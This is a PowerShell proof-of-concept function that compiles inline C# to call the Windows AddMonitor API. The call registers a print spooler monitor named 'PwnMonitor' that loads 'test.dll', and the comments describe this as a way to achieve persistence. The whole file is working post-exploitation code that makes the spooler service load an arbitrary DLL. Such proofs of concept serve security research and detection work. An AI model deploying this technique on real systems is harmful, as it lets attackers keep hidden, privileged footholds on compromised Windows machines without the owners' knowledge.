function Add-SpoolMonitor {
  <#
  @AUTHOR: Bret McDanel
  .SYNOPSIS
  Adds a spool monitor, PoC to demonstrate a way to achieve persistence
  .DESCRIPTION
  Adds a spool monitor, PoC to demonstrate a way to achieve persistence
  #>
  $ProgramVariable = @"
using System;
using System.Runtime.InteropServices;
namespace Persist
{
  public class Program
  {
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct MONITOR_INFO_2 {
    public string pName;
    public string pEnvironment;
    public string pDLLName;
  }
  [DllImport("winspool.drv", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern Int32 AddMonitor(String pName, UInt32 Level, ref MONITOR_INFO_2 pMonitors);

  public static void Main()
  { 
    MONITOR_INFO_2 monitorInfo;

    monitorInfo.pName = "PwnMonitor";
    monitorInfo.pEnvironment = null;
    monitorInfo.pDLLName = "test.dll";

    AddMonitor(null, 2, ref monitorInfo);
  }
 }
}
"@

  if (-not ([System.Management.Automation.PSTypeName]'Persist.Program').Type) {
    Add-Type -TypeDefinition $ProgramVariable -Language CSharp
  }
  Invoke-Expression "[Persist.Program]::Main()"
}
